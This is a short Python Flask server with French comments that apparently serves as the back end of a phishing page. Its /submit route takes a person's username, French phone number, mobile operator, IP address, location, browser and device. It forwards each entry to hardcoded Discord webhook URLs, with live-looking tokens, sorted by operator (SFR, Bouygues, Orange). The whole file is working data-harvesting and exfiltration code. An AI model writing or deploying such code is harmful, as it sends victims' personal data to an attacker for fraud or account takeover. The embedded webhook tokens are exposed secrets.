from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

# ============================================================
# CONFIGURATION - MET TES 3 WEBHOOKS ICI
# ============================================================
WEBHOOKS = {
    "sfr": "https://discord.com/api/webhooks/1531323012937420831/u2FSa0KVRK6yIwL38SB5oQFI6gDzPSmv3pfJgkns3_Ec0ykN7-Ueq44zzzxKCQtY19c-",
    "bouygues": "https://discord.com/api/webhooks/1531322878115446885/DFo1eu_x_XP21OiXPA445SjqzT8HGeD_WUhLIwQSxR7tXMtyO84ye35btxKMM6ZWdy7h",
    "orange": "https://discord.com/api/webhooks/1531323154419552428/oIm7zaxOlsJLyJ92PjXpDsKNERek--s0ts-8-GtacuIYrKVuG19U0-BWH_B7CBxh8VLC"
}

# ============================================================
# ROUTE DE TEST
# ============================================================
@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'ok', 'message': 'Serveur Flask en ligne'})

# ============================================================
# ROUTE PRINCIPALE
# ============================================================
@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data'}), 400

        username = data.get('username')
        phone = data.get('phone')
        operator = data.get('operator', '').lower()
        ip = data.get('ip', 'Inconnue')
        country = data.get('country', 'France')
        city = data.get('city', 'Inconnue')
        browser = data.get('browser', 'Inconnu')
        device = data.get('device', 'Inconnu')

        if not username or not phone or not operator:
            return jsonify({'error': 'Missing fields'}), 400

        # Trouver le bon webhook en fonction de l'opérateur
        webhook_url = WEBHOOKS.get(operator)
        if not webhook_url:
            # Si opérateur inconnu, envoyer sur le premier webhook (SFR par défaut)
            webhook_url = WEBHOOKS.get("sfr")
            if not webhook_url:
                return jsonify({'error': 'Aucun webhook configuré'}), 500

        # Construire le message
        message = f"🔑 **Nouvelle soumission**\n👻 @{username}\n📡 {operator.capitalize()}\n📞 +33{phone}\n🕵️ IP: {ip}\n🌍 {country} - {city}\n🌐 {browser}\n💾 {device}"

        # Envoyer au webhook Discord
        try:
            r = requests.post(webhook_url, json={'content': message})
            if r.status_code == 204:
                return jsonify({'success': True, 'message': f'Soumission envoyée à {operator}'})
            else:
                return jsonify({'error': f'Erreur Discord: {r.status_code}'}), 500
        except Exception as e:
            return jsonify({'error': str(e)}), 500

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# LANCEMENT
# ============================================================
if __name__ == '__main__':
    print('🚀 Serveur Flask sur http://127.0.0.1:5001')
    print('📡 Webhooks configurés :')
    for op, url in WEBHOOKS.items():
        print(f'  - {op}: {url[:50]}...')
    app.run(host='127.0.0.1', port=5001, debug=True)